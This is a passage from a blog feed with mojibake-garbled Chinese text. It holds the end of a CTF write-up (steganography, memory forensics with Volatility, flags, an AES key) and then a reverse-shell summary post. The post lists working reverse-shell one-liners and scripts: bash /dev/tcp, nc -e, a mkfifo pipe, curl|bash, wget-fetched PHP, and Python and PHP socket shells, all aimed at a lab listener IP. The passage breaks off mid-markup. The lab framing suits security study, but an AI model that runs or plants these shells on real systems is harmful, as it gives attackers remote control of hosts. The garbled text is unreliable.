class="line">CUMTCTF&#123;Welcome_to_CUMTCTF_2020_Final&#125;</span><br></pre></td></tr></table></figure><h2 id="å‡ºä¸ªæµé‡åˆ†æå§"><a href="#å‡ºä¸ªæµé‡åˆ†æå§" class="headerlink" title="å‡ºä¸ªæµé‡åˆ†æå§"></a>å‡ºä¸ªæµé‡åˆ†æå§</h2><p>httpæµbase64è§£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;WirRSharK_S0_E45y&#125;</span><br></pre></td></tr></table></figure><h2 id="å‡ºä¸ªLSBå§"><a href="#å‡ºä¸ªLSBå§" class="headerlink" title="å‡ºä¸ªLSBå§"></a>å‡ºä¸ªLSBå§</h2><p>LSBéšå†™</p><p>red green blue 0 0 0</p><p>ä¿å­˜å¾—äºŒç»´ç  æ‰«å¾—flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf&#123;1sb_i4_s0_Ea4y&#125;</span><br></pre></td></tr></table></figure><h2 id="å‡ºä¸ªä¼ªwebå§"><a href="#å‡ºä¸ªä¼ªwebå§" class="headerlink" title="å‡ºä¸ªä¼ªwebå§"></a>å‡ºä¸ªä¼ªwebå§</h2><p>æŸ¥çœ‹æœ€æ–°ä¿®æ”¹æ–‡ä»¶çš„æ—¶é—´</p><p>å¯ä»¥çœ‹åˆ°passä¸­æœ‰æ˜æ˜¾å­—ç¬¦ä¸²cumt</p><p>ç„¶åæ‹¿flagåŒ…è£¹å°±è¡Œ</p><h2 id="å‡ºä¸ªæ–‡æ¡£å§"><a href="#å‡ºä¸ªæ–‡æ¡£å§" class="headerlink" title="å‡ºä¸ªæ–‡æ¡£å§"></a>å‡ºä¸ªæ–‡æ¡£å§</h2><p>éšè—æ–‡å­—</p><h2 id="å†…å­˜å–è¯"><a href="#å†…å­˜å–è¯" class="headerlink" title="å†…å­˜å–è¯"></a>å†…å­˜å–è¯</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img imageinfo</span><br><span class="line">python vol.py -f memory.img --profile=Win2003SP0x86 filescan |grep flag</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰flag.pngï¼Œè¾“å‡ºä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 dumpfiles -D .&#x2F; -Q 0x000000000484f900</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå›¾ç‰‡æ‰«ä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br></pre></td></tr></table></figure><p>è§£ä¸å‡ºæ¥</p><p>æŸ¥çœ‹ç³»ç»Ÿçª—å£åˆ—è¡¨ï¼Œçœ‹æœ‰æ²¡æœ‰å’Œflagæœ‰å…³çš„ç¨‹åº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 windows | grep flag</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªç¨‹åºdumpä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 memdump -D .&#x2F; -p 1992</span><br></pre></td></tr></table></figure><p>ç”¨foremoståˆ†ç¦»ä¸€ä¸‹</p><p>å¯ä»¥çœ‹åˆ°æœ‰å›¾ç‰‡</p><p>æœ‰keyå€¼å’Œvi ç„¶åå°±æ˜¯AESåŠ å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key:Th1s_1s_K3y00000</span><br><span class="line">vi:1234567890123456</span><br><span class="line">base64:jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br><span class="line"></span><br><span class="line">flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125;</span><br></pre></td></tr></table></figure><h2 id="å‡ºä¸ªå‹ç¼©åŒ…å§"><a href="#å‡ºä¸ªå‹ç¼©åŒ…å§" class="headerlink" title="å‡ºä¸ªå‹ç¼©åŒ…å§"></a>å‡ºä¸ªå‹ç¼©åŒ…å§</h2><p>010æ‰“å¼€ä¹‹åå‘ç°æœ‰secret.pngæ²¡æœ‰ä¼ªåŠ å¯†ï¼Œå¾ˆæ˜æ˜¾å­å—è¢«ä¿®æ”¹</p><p>7aæ”¹æˆ74</p><p>åˆ†ç¦»å‡ºsecret.png</p><p>å‘ç°æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œä½†æœ‰ä¸¤å¸§</p><p>è„±åˆ°stegé‡Œé¢å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªæ®‹ç¼ºçš„äºŒç»´ç </p><p>è¡¥å…¨ï¼Œå°±å¯ä»¥çœ‹åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;yanji4n_bu_we1shi&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;CUMTåä¸ºæ¯&quot;&gt;&lt;a href=&quot;#CUMTåä¸ºæ¯&quot; class=&quot;headerlink&quot; title=&quot;CUMTåä¸ºæ¯&quot;&gt;&lt;/a&gt;CUMTåä¸ºæ¯&lt;/h1&gt;&lt;p&gt;webç‹—æ´»æˆäº†å„æ–¹å‘ç­¾åˆ°æ‰‹â€¦&lt;/p&gt;
&lt;h1 id=&quot;web&quot;&gt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://pz1o.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://pz1o.top/tags/CTF/"/>
    
    <category term="é¢˜è§£" scheme="https://pz1o.top/tags/%E9%A2%98%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>åå¼¹shellæ€»ç»“</title>
    <link href="https://pz1o.top/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/"/>
    <id>https://pz1o.top/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/</id>
    <published>2020-10-03T05:45:01.000Z</published>
    <updated>2020-11-20T14:19:35.452Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ€è¿‘é‡åˆ°åå¼¹shellï¼Œæ€»ç»“ä¸€ä¸‹åå¼¹shellï¼Œç”¨æ¥åšç¬”è®°</p><h1 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h1><p>åå‘ShellæŒ‡Shellå›å¼¹æˆ–è€…å«åå°„ï¼Œå°±æ˜¯è¯´å—å®³è€…kaliæŠŠè‡ªå·±çš„ShellæŒ‚è½½ï¼ˆæˆ–è€…å«attachæ›´åˆé€‚ï¼‰åˆ°æŸä¸ªç«¯å£ä¸Šï¼Œä»¥æ­¤æš´éœ²åˆ°æ”»å‡»è€…winå¯ä»¥è¿æ¥çš„ä½ç½®ï¼Œæ”»å‡»è€…winé€šè¿‡è¿æ¥è¯¥ç«¯å£æœ€ç»ˆæ‹¿åˆ°shellã€‚</p><p><strong>ä»¥ä¸‹å®éªŒéƒ½ä¸º</strong></p><p><strong>kaliä¸ºè¢«æ”»å‡»è€…æ¥æ¨¡ä»¿æœåŠ¡å™¨</strong></p><p><strong>winä¸ºæ”»å‡»è€…</strong></p><p>kaliï¼ˆæœåŠ¡ç«¯ï¼‰ï¼š192.168.202.129</p><p>winï¼ˆå®¢æˆ·ç«¯ï¼‰ï¼š169.254.158.23</p><h2 id="bashåå¼¹shell"><a href="#bashåå¼¹shell" class="headerlink" title="bashåå¼¹shell"></a><strong>bashåå¼¹shell</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/169.254.158.23/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>bashäº§ç”Ÿäº†ä¸€ä¸ªäº¤äº’ç¯å¢ƒè®©æœ¬åœ°ä¸»æœºä¸»åŠ¨å‘èµ·ä¸ç›®æ ‡ä¸»æœº8080ç«¯å£å»ºç«‹çš„è¿æ¥ï¼ˆå³TCP 8080 ä¼šè¯è¿æ¥ï¼‰ç›¸ç»“åˆï¼Œç„¶ååœ¨é‡å®šå‘ä¸ªtcp 8080ä¼šè¯è¿æ¥ï¼Œæœ€åå°†ç”¨æˆ·é”®ç›˜è¾“å…¥ä¸ç”¨æˆ·æ ‡å‡†è¾“å‡ºç›¸ç»“åˆå†æ¬¡é‡å®šå‘ç»™ä¸€ä¸ªæ ‡å‡†çš„è¾“å‡ºï¼Œå³å¾—åˆ°ä¸€ä¸ªbash åå¼¹ç¯å¢ƒã€‚</p><h3 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a><strong>å®éªŒ</strong></h3><p>é¦–å…ˆåœ¨winä¸Šç›‘å¬8080ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 8080</span><br></pre></td></tr></table></figure><blockquote><p>-n: ä¸åå‘è§£ædnsï¼Œå³ä¸é€šè¿‡ipè§£æåŸŸå no dns</p><p>-v: è¯¦ç»†ä¿¡æ¯è¾“å‡º verbose</p><p>-l:  ç›‘å¬ listen</p><p>-p: æŒ‡å®šç«¯å£ port</p></blockquote><p>ç„¶åå†kaliä¸Šè¿è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>ä¹‹ååå¼¹æˆåŠŸ</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002205548782.png" alt="image-20201002205548782"></p><h3 id="è§£é‡Š"><a href="#è§£é‡Š" class="headerlink" title="è§£é‡Š"></a>è§£é‡Š</h3><p>å…·ä½“å„å‚æ•°çš„æ„ä¹‰</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002205958997.png" alt="image-20201002205958997"></p><p><strong>linuxæ–‡ä»¶æè¿°ç¬¦</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - stdin ä»£è¡¨æ ‡å‡†è¾“å…¥,ä½¿ç”¨&lt;æˆ–&lt;&lt;</span><br><span class="line">1 - stdout ä»£è¡¨æ ‡å‡†è¾“å‡º,ä½¿ç”¨&gt;æˆ–&gt;&gt;</span><br><span class="line">2 - stderr ä»£è¡¨æ ‡å‡†é”™è¯¯è¾“å‡º,ä½¿ç”¨2&gt;æˆ–2&gt;&gt;</span><br></pre></td></tr></table></figure><p><strong>>&amp;</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">å½“&gt;&amp;åé¢æ¥æ–‡ä»¶æ—¶ï¼Œè¡¨ç¤ºå°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘è‡³æ–‡ä»¶ã€‚</span><br><span class="line">å½“&gt;&amp;åé¢æ¥æ–‡ä»¶æè¿°ç¬¦æ—¶ï¼Œè¡¨ç¤ºå°†å‰é¢çš„æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘è‡³åé¢çš„æ–‡ä»¶æè¿°ç¬¦</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&amp;å’Œ&gt;çš„åŒºåˆ«</span></span><br><span class="line">root@kali:/var/www/html# ls  //æŸ¥çœ‹æ— 1.php</span><br><span class="line">flag.php  index.php</span><br><span class="line">root@kali:/var/www/html# cat 1.php 2&gt;1  //å°†é”™è¯¯å†…å®¹è¾“å…¥åˆ°1æ–‡ä»¶ä¸­</span><br><span class="line">root@kali:/var/www/html# cat 1</span><br><span class="line">cat: 1.php: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line">root@kali:/var/www/html# cat 1.php 2&gt;&amp;1  //å°†é”™è¯¯å†…å®¹æŒ‰æ ‡å‡†è¾“å‡ºå‡ºæ¥</span><br><span class="line">cat: 1.php: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br></pre></td></tr></table></figure><ol><li>bash -i äº§ç”Ÿä¸€ä¸ªbashç¯å¢ƒ</li><li><code>/dev/tcp/ip/port</code>ï¼š <code>/dev/tcp/</code>æ˜¯Linuxä¸­çš„ä¸€ä¸ªç‰¹æ®Šè®¾å¤‡,æ‰“å¼€è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“äºå‘å‡ºäº†ä¸€ä¸ªsocketè°ƒç”¨ï¼Œå»ºç«‹ä¸€ä¸ªsocketè¿æ¥ï¼Œ&gt;&amp;åé¢è·Ÿä¸Š<code>/dev/tcp/ip/port</code>è¿™ä¸ªæ–‡ä»¶ä»£è¡¨å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ä¼ é€’åˆ°è¿œç¨‹ä¸Šï¼Œå¦‚æœè¿œç¨‹å¼€å¯äº†å¯¹åº”çš„ç«¯å£å»ç›‘å¬ï¼Œå°±ä¼šæ¥æ”¶åˆ°è¿™ä¸ªbashçš„æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºã€‚</li><li><code>0&gt;&amp;1</code>ï¼Œä»£è¡¨å°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œè¿™é‡Œçš„æ ‡å‡†è¾“å‡ºå·²ç»é‡å®šå‘åˆ°äº†<code>/dev/tcp/ip/port</code>è¿™ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¿œç¨‹ï¼Œé‚£ä¹ˆæ ‡å‡†è¾“å…¥ä¹Ÿå°±é‡å®šå‘åˆ°äº†è¿œç¨‹ï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥ç›´æ¥åœ¨è¿œç¨‹è¾“å…¥äº†</li></ol><h2 id="ncä¸€å¥è¯åå¼¹"><a href="#ncä¸€å¥è¯åå¼¹" class="headerlink" title="ncä¸€å¥è¯åå¼¹"></a>ncä¸€å¥è¯åå¼¹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><blockquote><p>-e: æŒ‡å®šncè¿æ¥æˆåŠŸåæ‰§è¡Œçš„ç¨‹åº</p></blockquote><p>æ— -eçš„æƒ…å†µä¸‹å¯ä»¥æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f;</span><br></pre></td></tr></table></figure><h3 id="å®éªŒ1"><a href="#å®éªŒ1" class="headerlink" title="å®éªŒ1"></a><strong>å®éªŒ</strong>1</h3><p>é¦–å…ˆåœ¨winï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸Šç›‘å¬7777ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨kaliï¼ˆæœåŠ¡ç«¯ï¼‰ä¸Šä¸€å¥è¯åå¼¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>åå¼¹æˆåŠŸ</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002211246793.png" alt="image-20201002211246793"></p><h3 id="å®éªŒ2"><a href="#å®éªŒ2" class="headerlink" title="å®éªŒ2"></a>å®éªŒ2</h3><p>winä¸Šç›‘å¬ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure><p>kaliä¸Šæ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f;</span><br></pre></td></tr></table></figure><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003140303187.png" alt="image-20201003140303187"></p><p>åå¼¹æˆåŠŸ</p><h2 id="curlåå¼¹"><a href="#curlåå¼¹" class="headerlink" title="curlåå¼¹"></a>curlåå¼¹</h2><p>å‰æè¦åˆ©ç”¨bashä¸€å¥è¯çš„æƒ…å†µä¸‹ä½¿ç”¨curlåå¼¹shell</p><p>kaliä¸Šindexæ–‡ä»¶ä¸Šå«æœ‰bashä¸€å¥è¯ï¼Œå°±å¯ä»¥åå¼¹shellã€‚</p><h3 id="å®éªŒ-1"><a href="#å®éªŒ-1" class="headerlink" title="å®éªŒ"></a><strong>å®éªŒ</strong></h3><p>kaliï¼ˆæœåŠ¡ç«¯ï¼‰ä¸Šæ£€æŸ¥æ˜¯å¦æœ‰bashä¸€å¥è¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.202.129</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>åœ¨winï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸Šç›‘å¬ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æœåŠ¡ç«¯curlåå¼¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.202.129|bash</span><br></pre></td></tr></table></figure><p>åå¼¹æˆåŠŸ</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002225540094.png" alt="image-20201002225540094"></p><h2 id="wgetåå¼¹"><a href="#wgetåå¼¹" class="headerlink" title="wgetåå¼¹"></a>wgetåå¼¹</h2><p>å…¶å®æ˜¯åˆ©ç”¨wgetå’Œphpè„šæœ¬ä¸€å—æ‰§è¡Œè¾¾åˆ°åå¼¹</p><h3 id="å®éªŒ-2"><a href="#å®éªŒ-2" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h3><p>é¦–å…ˆåœ¨winï¼ˆåº”è¯¥åœ¨ä»»ä½•ä¸€å°æœåŠ¡å™¨ä¸Šä¹Ÿè¡Œï¼‰ä¸Šæœ‰shell.txtï¼Œå†™å…¥ä»¥ä¸‹phpå†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock=fsockopen(<span class="string">"localhost"</span>,<span class="number">12345</span>);<span class="comment">//localhostä¸ºè‡ªå·±çš„ip</span></span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆåœ¨winï¼ˆå®¢æˆ·ç«¯ï¼‰ä¸Šç›‘å¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure><p>åœ¨kaliï¼ˆæœåŠ¡ç«¯ï¼‰ä¸Šåˆ©ç”¨wgetä¸‹è½½shell.txtï¼Œç„¶åæ‰§è¡Œphp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget 169.254.158.23:8888&#x2F;shell.txt -O &#x2F;tmp&#x2F;x.php &amp;&amp; php &#x2F;tmp&#x2F;x.php</span><br></pre></td></tr></table></figure><p>åå¼¹æˆåŠŸ</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002232826494.png" alt="image-20201002232826494"></p><h2 id="pythonåå¼¹"><a href="#pythonåå¼¹" class="headerlink" title="pythonåå¼¹"></a>pythonåå¼¹</h2><p>åˆ©ç”¨curl</p><p>ä½†è¿™æ¬¡ç”¨çš„æ˜¯pyè„šæœ¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-*- coding: utf-8 -*-</span></span><br><span class="line">import socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect(("169.254.158.23",7777)) #æ›´æ”¹localhostä¸ºè‡ªå·±çš„ip,ç«¯å£ä»»æ„</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call(["/bin/sh","-i"])</span><br></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("169.254.158.23",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span><br></pre></td></tr></table></figure><p>æ•ˆæœæ˜¯ä¸€æ ·çš„</p><h3 id="å®éªŒ1-1"><a href="#å®éªŒ1-1" class="headerlink" title="å®éªŒ1"></a>å®éªŒ1</h3><p>é¦–å…ˆåœ¨kaliï¼ˆæœåŠ¡ç«¯ï¼‰ä¸Šå†™ä¸‹pyè„šæœ¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python</span></span><br><span class="line"><span class="meta">#</span><span class="bash">-*- coding: utf-8 -*-</span></span><br><span class="line">import socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect(("169.254.158.23",7777)) #æ›´æ”¹localhostä¸ºè‡ªå·±çš„ip,ç«¯å£ä»»æ„</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call(["/bin/sh","-i"])</span><br></pre></td></tr></table></figure><p>winï¼ˆå®¢æˆ·ç«¯ï¼‰ç›‘å¬</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp <span class="number">7777</span></span><br></pre></td></tr></table></figure><p>kaliï¼ˆæœåŠ¡ç«¯ï¼‰curl</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.202.129/shell.py|python</span><br></pre></td></tr></table></figure><p>åå¼¹æˆåŠŸ</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003131626423.png" alt="image-20201003131626423"></p><h3 id="å®éªŒ2-1"><a href="#å®éªŒ2-1" class="headerlink" title="å®éªŒ2"></a>å®éªŒ2</h3><p>åœ¨winï¼ˆå®¢æˆ·ç«¯ï¼‰ç›‘å¬ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure><p>åœ¨kaliï¼ˆæœåŠ¡ç«¯ï¼‰è¾“å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;169.254.158.23&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure><p>åå¼¹æˆåŠŸ</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003133539912.png" alt="image-20201003133539912"></p><h2 id="phpåå¼¹"><a href="#phpåå¼¹" class="headerlink" title="phpåå¼¹"></a>phpåå¼¹</h2><p>å’Œpythonä¸€æ ·åˆ©ç”¨curl</p><p>phpè„šæœ¬å¦‚ä¸‹ï¼Œå’Œä¸Šé¢çš„shell.txtä¸€æ ·çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock=fsockopen(<span class="string">"169.254.158.23"</span>,<span class="number">7777</span>);<span class="comment">//localhostä¸ºè‡ªå·±çš„ipï¼Œç«¯å£ä»»æ„</span></span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("169.254.158.23",7777);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><h3 id="å®éªŒ1-2"><a href="#å®éªŒ1-2" class="headerlink" title="å®éªŒ1"></a>å®éªŒ1</h3><p>é¦–å…ˆåœ¨kaliï¼ˆæœåŠ¡ç«¯ï¼‰å†™ä¸‹phpè„šæœ¬ï¼Œå­˜ä¸ºshell.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock=fsockopen(<span class="string">"169.254.158.23"</span>,<span class="number">7777</span>);<span class="comment">//localhostä¸ºè‡ªå·±çš„ipï¼Œç«¯å£ä»»æ„</span></span><br><span class="line">exec(<span class="string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨winï¼ˆå®¢æˆ·ç«¯ï¼‰ç›‘å¬ç«¯å£</p><figure class="highlight cmd"><table><tr><td 